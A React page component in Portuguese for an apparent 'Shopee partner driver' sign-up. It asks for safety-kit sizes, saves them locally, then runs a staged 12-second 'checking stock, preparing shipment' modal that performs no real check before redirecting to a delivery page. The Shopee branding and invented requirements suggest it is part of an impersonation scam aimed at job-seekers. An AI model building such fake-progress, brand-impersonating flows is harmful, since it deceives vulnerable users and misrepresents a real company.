import React, { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { z } from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';

import Header from '@/components/Header';
import Footer from '@/components/Footer';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Checkbox } from '@/components/ui/checkbox';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { useToast } from '@/hooks/use-toast';
import { LoadingModal } from '@/components/LoadingModal';
import { useScrollTop } from '@/hooks/use-scroll-top';

import kitEpiImage from '../assets/kit-epi-new.webp';

const finalizacaoSchema = z.object({
  tamanhoColete: z.enum(['P', 'M', 'G', 'GG']),
  tamanhoLuva: z.enum(['P', 'M', 'G', 'GG']),
  numeroCalcado: z.string().min(2, "Número de calçado inválido"),
  termoUso: z.boolean().refine(val => val === true, "Você precisa aceitar os termos de uso"),
});

type FinalizacaoFormValues = z.infer<typeof finalizacaoSchema>;

const Finalizacao: React.FC = () => {
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  const [, navigate] = useLocation();
  const { toast } = useToast();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [formSubmitted, setFormSubmitted] = useState(false);
  const [selectedShoeSize, setSelectedShoeSize] = useState<string>("40");

  const { register, handleSubmit, formState: { errors }, setValue, watch } = useForm<FinalizacaoFormValues>({
    resolver: zodResolver(finalizacaoSchema),
    defaultValues: {
      tamanhoColete: 'M',
      tamanhoLuva: 'M',
      numeroCalcado: '40',
      termoUso: false,
    }
  });
  
  // Função para alternar o estado do checkbox dos termos de uso
  const handleTermsToggle = () => {
    // Obter o valor atual e alterniar para o oposto
    const currentValue = watch('termoUso');
    setValue('termoUso', !currentValue, { shouldValidate: true });
  };

  // Função para selecionar o tamanho do calçado
  const handleShoeSize = (size: string) => {
    setSelectedShoeSize(size);
    setValue('numeroCalcado', size, { shouldValidate: true });
  };
  
  const handleFormSubmit = (data: FinalizacaoFormValues) => {
    setIsSubmitting(true);
    
    try {
      // Atualizando o tamanho do calçado a partir do estado
      const updatedData = {
        ...data,
        numeroCalcado: selectedShoeSize
      };
      
      // Salvando dados no localStorage
      localStorage.setItem('epi_data', JSON.stringify(updatedData));
      
      // Iniciar processo de carregamento
      setShowLoadingModal(true);
    } catch (error) {
      toast({
        title: "Erro ao salvar dados",
        description: "Ocorreu um erro ao processar suas informações. Tente novamente.",
        variant: "destructive",
      });
      setIsSubmitting(false);
    }
  };

  const handleLoadingComplete = () => {
    setShowLoadingModal(false);
    // Redirecionar para a página de entrega em vez de mostrar a tela de finalização
    navigate('/entrega');
  };

  const handleFinalizar = () => {
    navigate('/');
    toast({
      title: "Cadastro finalizado!",
      description: "Parabéns! Seu cadastro foi concluído com sucesso. Em breve entraremos em contato.",
    });
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#F5F5F5] text-sm font-['Roboto',sans-serif]">
      <header 
        className="bg-white py-2 px-4 flex items-center rounded-b-sm"
        style={{ 
          boxShadow: "0 4px 10px -3px rgba(0, 0, 0, 0.2)"
        }}
      >
        <a href="/" className="text-[#EF4444] text-xl">
          <i className="fas fa-arrow-left"></i>
        </a>
        <h1 className="text-lg font-normal text-center flex-grow text-[#10172A]">Motorista Parceiro Shopee</h1>
      </header>
      
      <div className="bg-[#F5F5F5] h-[10px]"></div>
      
      {!formSubmitted ? (
        <div className="w-full bg-white">
          <div className="bg-[#F5F5F5] p-3">
            <p className="text-[#6E6E6E] text-xs translate-y-1">Kit de Segurança</p>
          </div>
          
          <div className="p-3 border-b border-gray-200">
            <div className="flex flex-col md:flex-row gap-4 items-center">
              <div className="w-full md:w-2/5">
                <img 
                  src={kitEpiImage} 
                  alt="Kit EPI Shopee" 
                  className="w-full rounded-sm"
                />
              </div>
              <div className="w-full md:w-3/5">
                <h4 className="text-sm font-medium mb-2 text-[#212121]">Kit Completo de Segurança</h4>
                <p className="text-[#6E6E6E] text-xs mb-2">
                  Para garantir sua segurança durante as entregas, a Shopee exige que todos os entregadores 
                  utilizem equipamentos de proteção individual. O kit inclui:
                </p>
                <ul className="list-disc pl-5 mb-3 space-y-1 text-[#212121] text-xs">
                  <li>2 Coletes refletivos com identificação Shopee (laranja e amarelo)</li>
                  <li>Par de luvas de proteção</li>
                  <li>Botas de segurança antiderrapantes</li>
                </ul>
                <div className="bg-yellow-50 p-2 rounded-sm border border-yellow-200">
                  <p className="text-xs text-yellow-800">
                    <strong>Importante:</strong> O uso do kit completo é obrigatório durante todas 
                    as entregas. O não uso pode resultar em suspensão temporária.
                  </p>
                </div>
              </div>
            </div>
          </div>
          
          <div className="bg-[#F5F5F5] p-3">
            <p className="text-[#6E6E6E] text-xs translate-y-1">Tamanho do Colete</p>
          </div>
          
          <div className="p-3 border-b border-gray-200">
            <Select
              onValueChange={(value) => setValue('tamanhoColete', value as any)}
              defaultValue={watch('tamanhoColete')}
            >
              <SelectTrigger className="w-full text-[#212121] placeholder-[#969696] border-gray-200">
                <SelectValue placeholder="Selecione o tamanho" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="P">P</SelectItem>
                <SelectItem value="M">M</SelectItem>
                <SelectItem value="G">G</SelectItem>
                <SelectItem value="GG">GG</SelectItem>
              </SelectContent>
            </Select>
          </div>
          
          <div className="bg-[#F5F5F5] p-3">
            <p className="text-[#6E6E6E] text-xs translate-y-1">Tamanho da Luva</p>
          </div>
          
          <div className="p-3 border-b border-gray-200">
            <Select
              onValueChange={(value) => setValue('tamanhoLuva', value as any)}
              defaultValue={watch('tamanhoLuva')}
            >
              <SelectTrigger className="w-full text-[#212121] placeholder-[#969696] border-gray-200">
                <SelectValue placeholder="Selecione o tamanho" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="P">P</SelectItem>
                <SelectItem value="M">M</SelectItem>
                <SelectItem value="G">G</SelectItem>
                <SelectItem value="GG">GG</SelectItem>
              </SelectContent>
            </Select>
          </div>
          
          <div className="bg-[#F5F5F5] p-3">
            <p className="text-[#6E6E6E] text-xs translate-y-1">Número do Calçado</p>
          </div>
          
          <div className="p-3 border-b border-gray-200">
            <div className="grid grid-cols-5 gap-2">
              {Array.from({ length: 11 }, (_, i) => (i + 35).toString()).map((size) => (
                <Button
                  key={size}
                  type="button"
                  variant="outline"
                  onClick={() => handleShoeSize(size)}
                  className={`py-1 px-2 text-xs ${
                    selectedShoeSize === size 
                      ? 'bg-[#EF4444] text-white border-[#EF4444]' 
                      : 'border-gray-300 text-[#212121]'
                  }`}
                >
                  {size}
                </Button>
              ))}
            </div>
            <input 
              type="hidden" 
              {...register('numeroCalcado')} 
              value={selectedShoeSize} 
            />
            {errors.numeroCalcado && (
              <p className="mt-1 text-xs text-red-600">{errors.numeroCalcado.message}</p>
            )}
          </div>
          
          <div className="p-3 border-b border-gray-200">
            <div className="flex items-start space-x-2">
              <Checkbox
                id="termoUso" 
                {...register('termoUso')}
                className={errors.termoUso ? 'border-red-500' : 'border-[#EF4444] data-[state=checked]:bg-[#EF4444] data-[state=checked]:text-white'}
                onCheckedChange={() => handleTermsToggle()}
              />
              <div className="grid gap-1 leading-none" onClick={() => handleTermsToggle()}>
                <label
                  htmlFor="termoUso"
                  className="text-sm text-[#212121] leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70 cursor-pointer"
                >
                  Concordo com os termos de uso e política de segurança da Shopee
                </label>
                <p className="text-xs text-[#6E6E6E]">
                  Declaro que usarei os equipamentos de proteção durante todas as entregas.
                </p>
                {errors.termoUso && (
                  <p className="text-xs text-red-600">{errors.termoUso.message}</p>
                )}
              </div>
            </div>
          </div>
          
          <div className="p-3">
            <form onSubmit={handleSubmit(handleFormSubmit)}>
              <Button
                type="submit"
                className="w-full bg-[#EF4444] text-white py-2 rounded-sm"
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Processando...' : 'Solicitar Kit e Finalizar'}
              </Button>
            </form>
          </div>
        </div>
      ) : (
        <div className="w-full bg-white p-3">
          <div className="text-[#EF4444] mb-4 flex justify-center">
            <svg xmlns="http://www.w3.org/2000/svg" width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="mx-auto">
              <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
              <polyline points="22 4 12 14.01 9 11.01"></polyline>
            </svg>
          </div>
          
          <h1 className="text-lg font-medium mb-3 text-[#212121] text-center">Cadastro Concluído!</h1>
          
          <p className="text-sm text-[#6E6E6E] mb-4 text-center">
            Parabéns! Seu cadastro como Entregador Parceiro Shopee foi concluído com sucesso.
            Seu kit EPI será enviado para o endereço cadastrado em até 5 dias úteis.
          </p>
          
          <div className="bg-[#FFF8F6] p-3 rounded-sm border border-[#EF4444] mb-4">
            <h3 className="font-medium text-[#EF4444] mb-2 text-sm">Próximos Passos:</h3>
            <ol className="list-decimal pl-5 text-[#212121] text-xs space-y-1">
              <li>Você receberá um e-mail de confirmação em até 24 horas.</li>
              <li>O kit EPI será enviado em até 5 dias úteis.</li>
              <li>Após o recebimento do kit, você já poderá começar a receber entregas.</li>
              <li>Download do aplicativo de entregas Shopee (enviado por e-mail).</li>
            </ol>
          </div>
          
          <Button
            onClick={handleFinalizar}
            className="w-full bg-[#EF4444] text-white py-2 rounded-sm"
          >
            Voltar ao Início
          </Button>
        </div>
      )}
      
      <div className="pb-[50px]"></div>
      
      <Footer />
      
      <LoadingModal
        isOpen={showLoadingModal}
        onComplete={handleLoadingComplete}
        title="Finalizando Cadastro"
        loadingSteps={[
          "Registrando tamanhos do kit EPI",
          "Verificando disponibilidade em estoque",
          "Preparando envio do material",
          "Finalizando cadastro de entregador"
        ]}
        completionMessage="Cadastro finalizado com sucesso!"
        loadingTime={12000}
      />
    </div>
  );
};

export default Finalizacao;